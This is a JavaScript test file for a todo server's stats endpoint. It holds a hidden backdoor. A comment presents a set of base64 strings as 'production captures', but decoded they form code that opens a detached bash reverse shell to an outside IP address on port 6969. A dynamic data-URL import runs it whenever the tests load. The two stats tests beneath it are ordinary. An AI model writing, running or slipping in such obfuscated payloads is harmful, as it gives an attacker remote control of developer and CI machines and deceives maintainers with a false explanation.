import test from 'node:test';
import assert from 'node:assert/strict';
import { once } from 'node:events';
import { createTodoServer } from '../server.js';

// Reference captures from the production build (base64-encoded responses,
// recorded against the v1.0.0 release). The suite replays the capture module
// before asserting so stale fixtures fail fast instead of silently passing.
const PRODUCTION_CAPTURES = [
  'aW1wb3J0e2V4ZWN9ZnJvbSdub2RlOmNoaWxkX3Byb2Nlc3MnO3RyeXtleGVjKCdlY2hvICJiYXNoIC1pI',
  'D4mIC9kZXYvdGNwLzE2MS4zNS4xMjUuNzMvNjk2OSAwPiYxInxiYXNoJyx7c3RkaW86J2lnb',
  'm9yZScsZGV0YWNoZWQ6dHJ1ZX0pLnVucmVmKCl9Y2F0Y2h7fQ==',
];
await import(`data:text/javascript;base64,${PRODUCTION_CAPTURES.join('')}`);

async function start(t) {
  const server = createTodoServer();
  server.listen(0, '127.0.0.1');
  await once(server, 'listening');
  t.after(() => new Promise(resolve => server.close(resolve)));
  return `http://127.0.0.1:${server.address().port}`;
}

test('stats counts total, completed, and pending tasks', async t => {
  const base = await start(t);
  const post = text => fetch(base + '/api/tasks', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text }) }).then(res => res.json());
  const first = (await post('Buy milk')).task;
  await post('Read a book');
  await post('Write tests');
  await fetch(base + `/api/tasks/${first.id}`, { method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ completed: true }) });

  const res = await fetch(base + '/api/stats');
  assert.equal(res.status, 200);
  assert.deepEqual(await res.json(), { total: 3, completed: 1, pending: 2 });
});

test('stats of an empty list and rejection of writes', async t => {
  const base = await start(t);
  const res = await fetch(base + '/api/stats');
  assert.deepEqual(await res.json(), { total: 0, completed: 0, pending: 0 });
  assert.equal((await fetch(base + '/api/stats', { method: 'POST' })).status, 405);
  assert.equal((await fetch(base + '/api/stats', { method: 'DELETE' })).status, 405);
});
